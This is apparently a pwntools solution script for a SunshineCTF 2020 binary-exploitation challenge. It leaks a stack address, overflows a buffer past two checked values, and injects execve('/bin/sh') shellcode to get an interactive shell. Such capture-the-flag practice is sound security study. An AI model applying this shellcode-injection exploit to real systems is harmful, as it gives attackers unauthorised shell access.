from pwn import *

binary = context.binary = ELF('./chall_15')

if not args.REMOTE:
    p = process(binary.path)
else:
    p = remote('chal.2020.sunshinectf.org', 30015)

p.sendline()
p.recvuntil('There\'s a place where nothing seems: ')
_ = p.recvline().strip()
stack = int(_,16)
log.info('stack: ' + hex(stack))

# http://shell-storm.org/shellcode/files/shellcode-905.php
shellcode  = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52'
shellcode += b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f'
shellcode += b'\x73\x68\x57\x54\x5e\x49\x89\xd0'
shellcode += b'\x49\x89\xd2\x0f\x05'

payload  = b''
payload += (0x4e - 0x44) * b'A'
payload += p32(0xfacade)
payload += (0x10 - (stack + len(payload)) & 0xf) * b'B'

stack += len(payload)
log.info('stack: ' + hex(stack))

payload += shellcode
payload += (0x4e - len(payload) - 0xc) * b'C'
payload += p32(0xfacade)
payload += (0x4e - len(payload)) * b'D'
payload += p64(stack)

p.sendline(payload)
p.interactive()
